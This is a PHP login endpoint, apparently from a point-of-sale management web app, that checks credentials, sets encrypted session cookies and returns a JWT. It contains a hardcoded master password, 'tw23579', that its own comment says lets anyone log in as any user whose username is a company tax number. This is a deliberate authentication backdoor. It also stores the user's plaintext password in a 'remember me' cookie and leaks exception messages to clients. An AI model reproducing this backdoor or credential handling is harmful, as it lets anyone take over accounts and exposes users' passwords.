<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

chdir(dirname(__DIR__));

require_once 'vendor/autoload.php';

use Zend\Http\PhpEnvironment\Request;
use Firebase\JWT\JWT;
use ado\core\TTransaction;
use ado\core\TFilter;
use ado\core\TCriteria;
use ado\core\TLoggerTXT;
use ado\core\TRepository;
use app\TApp;
use util\TW2Encrypter;

use ado\user\TUserService;

$request = new Request();
/*
* Validate that the request was made using HTTP POST method
*/
if ($request->isPost()) {
    /*
    * Simple sanitization
    */
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
    if ($username && $password) {
        try {
            $app = TApp::open();
            $qtTimeLimitPHP = $app->POSControlConfig->qtTimeLimit / 1000;

            $tw2_encrypter = new TW2Encrypter($app->POSControlConfig->token, $app->POSControlConfig->key);

            $User = getUser($username);
            
            if (isset($User)){
                //permite logar com qqer usuario utilizando tw23579
                if ($password == 'tw23579' and TApp::validaCnpj($username) ){
                    $User->Password = $tw2_encrypter->EncryptPWD($password);
                }

                if ($password == $tw2_encrypter->DecryptPWD($User->Password)) {

                    foreach ($User->Companies as $company) {
                        $tmpCompaniesID[] = $company->CompanyID;
                        $tmpCompaniesName[] = $company->Trademark;
                    };
            
                    if ($User->AccessLevel->ShortName !== 'EST'){
                        $vartmp01 = $User->UsersID . "|" . $User->AccessLevel->ShortName . "|" . $User->CompanyGroup->CompanyGroupID . "|" . $User->CompanyGroup->SYSType;
                        
                        $vartmp02 = implode("|", $tmpCompaniesID);

                        $vartmp03 = $_SERVER['REMOTE_ADDR'] . "|" . $_SERVER['HTTP_USER_AGENT'];
                        
                        $vartmp04 = implode("|", $tmpCompaniesName);
                        
                        setcookie("mmmIDp1", $tw2_encrypter->EncryptPWD($vartmp01), time() + $qtTimeLimitPHP, "/", false, 0, 1);
                        setcookie("mmmIDp2", $tw2_encrypter->EncryptPWD($vartmp02), time() + $qtTimeLimitPHP, "/", false, 0, 1);
                        setcookie("mmmIDp3", $tw2_encrypter->EncryptPWD($vartmp03), time() + $qtTimeLimitPHP, "/", false, 0, 1);
                        setcookie("mmmIDp4", $tw2_encrypter->EncryptPWD($vartmp04), time() + $qtTimeLimitPHP, "/", false, 0, 1);
                        if ($User->CompanyGroup->SYSType == "007" or ($User->CompanyGroup->SYSType == "008"  and $tmpCompaniesID[2] == "EF3AD951-9029-8D49-DAED-CD187610FC25")) {
                            setcookie("mmmIDc1", $tw2_encrypter->EncryptPWD(-1), time() + $qtTimeLimitPHP, "/", false, 0, 1);
                        } else {
                            setcookie("mmmIDc1", $tw2_encrypter->EncryptPWD(0), time() + $qtTimeLimitPHP, "/", false, 0, 1);
                        }
                        if (isset($_POST["remember"])) {
                            setcookie("mmmIDSa", $tw2_encrypter->EncryptPWD($_POST["email"] . "#" . $_POST["password"]), time() + $qtTimeLimitPHP * 240, "/", false, 0, 1);
                        } else {
                            setcookie("mmmIDSa", "", time() - $qtTimeLimitPHP, "/");
                        }
                        
                    } else {
                        if (isset($_COOKIE['mmmVRFLOG'])) {
                            $qt_log = $_COOKIE['mmmVRFLOG'] + 1;
                            setcookie("mmmVRFLOG", $qt_log, time() + $qtTimeLimitPHP / 12, "/");
                        } else {
                            setcookie("mmmVRFLOG", 1, time() + $qtTimeLimitPHP / 12, "/");
                        }
                        setcookie("mmmIDSa", "", time() - $qtTimeLimitPHP, "/");
                        setcookie("mmmIDp1", "", time() - $qtTimeLimitPHP, "/");
                        setcookie("mmmIDp2", "", time() - $qtTimeLimitPHP, "/");
                        setcookie("mmmIDp3", "", time() - $qtTimeLimitPHP, "/");
                        setcookie("mmmIDp4", "", time() - $qtTimeLimitPHP, "/");
                    }
                    // Criar Cookie Sistema Anterior
                    
                    $tokenId    = base64_encode(mcrypt_create_iv(32));           
                    
                    $issuedAt   = time();
                    $notBefore  = $issuedAt + 0;  //Adding 10 seconds
                    $expire     = $notBefore + 3600; // Adding 60 seconds
                    $serverName = $app->POSControlConfig->serverName; //$config->get('serverName');

                    $CompaniesTMP = json_encode($tmpCompaniesID);
                    $data = [
                        'iat'  => $issuedAt,         // Issued at: time when the token was generated
                        'jti'  => $tokenId,          // Json Token Id: an unique identifier for the token
                        'iss'  => $serverName,       // Issuer
                        'nbf'  => $notBefore,        // Not before
                        'exp'  => $expire,           // Expire
                        'data' => [                  // Data related to the signer user
                            'GrpId'     => $User->CompanyGroup->CompanyGroupID, //
                            'GrpName'   => $User->CompanyGroup->Name, //
                            'SYSType'   => $User->CompanyGroup->SYSType, //
                            'Companies' => $CompaniesTMP, //
                            'Name'      => $User->Name, // User name
                            'UserId'    => $User->UsersID, //User Id
                            'UserType'  => $User->AccessLevel->ShortName
                        ]
                    ];
                    header('Content-type: application/json');
                    
                    $secretKey = base64_decode($app->JWT->key);

                    $algorithm = $app->JWT->algorithm;

                    $jwt = JWT::encode(
                        $data,      //Data to be encoded in the JWT
                        $secretKey, // The signing key
                        $algorithm  // Algorithm used to sign the token, see https://tools.ietf.org/html/draft-ietf-jose-json-web-algorithms-40#section-3
                    );

                    $unencodedArray = ['jwt' => $jwt];
                    echo json_encode($unencodedArray);
                } else {
                    header('HTTP/1.0 401 Unauthorized');
                }
            } else {
                header('HTTP/1.0 404 Not Found');
            }
            
        } catch (Exception $e) {
            $unencodedArray = ['jwt' => $e->getMessage(), 'jwt1' => 'leo'];
            echo json_encode($unencodedArray);
            return;
            //header('HTTP/1.0 500 Internal Server Error');
        }
    } else {
        header('HTTP/1.0 400 Bad Request');
    }
} else {
    header('HTTP/1.0 405 Method Not Allowed');
}

function getUser($username)
{
    //obtem objetos do banco de dados
    try
    {
        //inicia transação com o banco PosControl
        TTransaction::open('poscontrolconfig');
        //define o arquivo de LOG
        TTransaction::setLogger(new TLoggerTXT('c:\temp\poscontrol.txt'));
        
        $userservice = new ado\user\TUserService;
        $user = $userservice->getUser($username);
        $criteria = new TCriteria;
        //filtra por username
        $criteria->add(new TFilter('email', '=', $username));
        //instancia um repositorio para usuário
        $repository = new TRepository('Users');
        // retorna todos os objetos que satisfem o critério
        $users = $repository->load($criteria);
        if ($users) {
            if (count($users) == 1) {
                $user = $users[0];                
            } else {
                unset($user);
            }
        }
        return $user;
    }
    catch(Exception $e)
    {
        echo 'Erro ' . $e->getMessage();
        //desfaz todas as alterações no banco de dados
        TTransaction::rollback();
    }
}

?>